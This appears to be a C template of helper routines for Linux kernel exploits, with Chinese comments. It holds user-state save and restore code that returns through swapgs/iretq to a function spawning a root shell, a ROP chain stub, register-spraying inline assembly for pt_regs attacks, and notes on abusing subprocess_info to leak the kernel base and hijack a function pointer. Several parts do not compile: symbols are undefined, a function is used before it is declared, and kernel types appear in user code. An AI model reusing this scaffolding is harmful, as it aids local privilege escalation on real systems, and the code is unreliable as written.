#define _GNU_SOURCE

// clang-format off
#include <asm/ldt.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <semaphore.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/ptrace.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <unistd.h>
#include <linux/keyctl.h>
#include <linux/userfaultfd.h>

// clang-format on

size_t kernel_base = 0xffffffff81000000;
size_t kernel_offset = 0;

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define log_debug(fmt, ...)                                                    \
  dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)

#define log_info(fmt, ...)                                                     \
  dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__,        \
          __LINE__, ##__VA_ARGS__)

#define log_warning(fmt, ...)                                                  \
  dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__,       \
          __LINE__, ##__VA_ARGS__)

#define log_error(fmt, ...)                                                    \
  dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__,          \
          __LINE__, ##__VA_ARGS__)

#define die(fmt, ...)                                                          \
  do {                                                                         \
    log_error(fmt, ##__VA_ARGS__);                                             \
    log_error("Exit at line %d", __LINE__);                                    \
    exit(1);                                                                   \
  } while (0)

void debug() {
  log_warning("debug");
  getchar();
}

/*
 * 保存用户态数据
 */
uint64_t user_cs, user_ss, user_rflags, user_rsp;

void save_status_() {
  asm volatile("mov user_cs, cs;"
               "mov user_ss, ss;"
               "mov user_rsp, rsp;"
               "pushf;"
               "pop user_rflags;");
  log_info("status saved");
}

void save_status() {
  asm volatile("movq %%cs, %0;"
               "movq %%ss, %1;"
               "movq %%rsp, %3;"
               "pushfq;"
               "pop %2;"
               : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
               :
               : "memory");
}

static void restore_status() {
  asm volatile("swapgs ;"
               "movq %0, 0x20(%%rsp)\t\n"
               "movq %1, 0x18(%%rsp)\t\n"
               "movq %2, 0x10(%%rsp)\t\n"
               "movq %3, 0x08(%%rsp)\t\n"
               "movq %4, 0x00(%%rsp)\t\n"
               "iretq"
               :
               : "r"(user_ss), "r"(user_rsp), "r"(user_rflags), "r"(user_cs),
                 "r"(get_shell));
}

/*
 * 绑定cpu core
 */
void bind_core(int core) {
  cpu_set_t cpu_set;

  CPU_ZERO(&cpu_set);
  CPU_SET(core, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
  log_info("bind core to => %d", core);
}

/*
 * root 执行，从而获得权限
 */
void get_shell(void) {
  if (getuid()) {
    die("Failed to get the root!");
  }

  log_info(" Successful to get the root.");
  log_info(" execve root shell now...");

  system("/bin/sh");
  exit(0);
}

static void get_root_shell() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  if (!getuid()) {
    log_info("get shell !");
    execve("/bin/sh", argv, envp);
  } else {
    die("fail get root");
  }
}

void rop() {
  size_t rop[0x10], i = 0;
  // swapgs --> iretq: rip, cs, rflags, rsp, ss. get_she;;
  rop[i++] = swapgs; // 后面还存在指令，需要查看到ret前的内容
  rop[i++] = 0;
  rop[i++] = iretq;
  rop[i++] = (size_t)get_shell; // rip
  rop[i++] = user_cs;
  rop[i++] = user_rflags;
  rop[i++] = user_rsp;
  rop[i++] = user_ss;
}


/*
 * pt_regs
 * CONFIG_RANDOMIZE_KSTACK_OFFSET=y  可以一定程度避免这种攻击
 */
__asm__("mov r15, 0x55555555;"
        "mov r14, 0x44444444;"
        "mov r13, 0x33333333;"
        "mov r12, 0x22222222;"
        "mov rbp, 0xbbbb1111;"
        "mov rbx, 0xbbbb2222;"
        "mov r11, 0x11111111;"
        "mov r10, 0x11110000;"
        "mov r9,  0x99999999;"
        "mov r8,  0x88888888;"
        "xor rax, rax;"
        "mov rcx, 0x666666;"
        "mov rdx, 8;"
        "mov rsi, rsp;"
        "mov rdi, seq_fd;"
        "syscall");


// use socket(22, AF_INET, 0) create 如下的结构体， size-128 kmalloc-128
// 因为该结构体在创建之后就会被释放掉，因此基于该结构体的利用都要用到条件竞争。
struct subprocess_info {
  struct work_struct work; // leak kernel base by work.func
  struct completion *complete;
  const char *path;
  char **argv;
  char **envp;
  int wait;
  int retval;
  int (*init)(struct subprocess_info *info, struct cred *new);
  void (*cleanup)(
      struct subprocess_info *info); // 设置info->cleanup，触发执行if
                                     // (info->cleanup) info->cleanup(info);
  void *data;
} __randomize_layout;

struct work_struct {
  atomic_long_t data;
  struct list_head entry;
  work_func_t func;
#ifdef CONFIG_LOCKDEP
  struct lockdep_map lockdep_map;
#endif
};

void hexdump(const void *data, size_t size) {
  char ascii[17];
  size_t i, j;
  ascii[16] = '\0';
  for (i = 0; i < size; ++i) {
    printf("%02X ", ((unsigned char *)data)[i]);
    if (((unsigned char *)data)[i] >= ' ' &&
        ((unsigned char *)data)[i] <= '~') {
      ascii[i % 16] = ((unsigned char *)data)[i];
    } else {
      ascii[i % 16] = '.';
    }
    if ((i + 1) % 8 == 0 || i + 1 == size) {
      printf(" ");
      if ((i + 1) % 16 == 0) {
        printf("|  %s \n", ascii);
      } else if (i + 1 == size) {
        ascii[(i + 1) % 16] = '\0';
        if ((i + 1) % 16 <= 8) {
          printf(" ");
        }
        for (j = (i + 1) % 16; j < 16; ++j) {
          printf("   ");
        }
        printf("|  %s \n", ascii);
      }
    }
  }
}
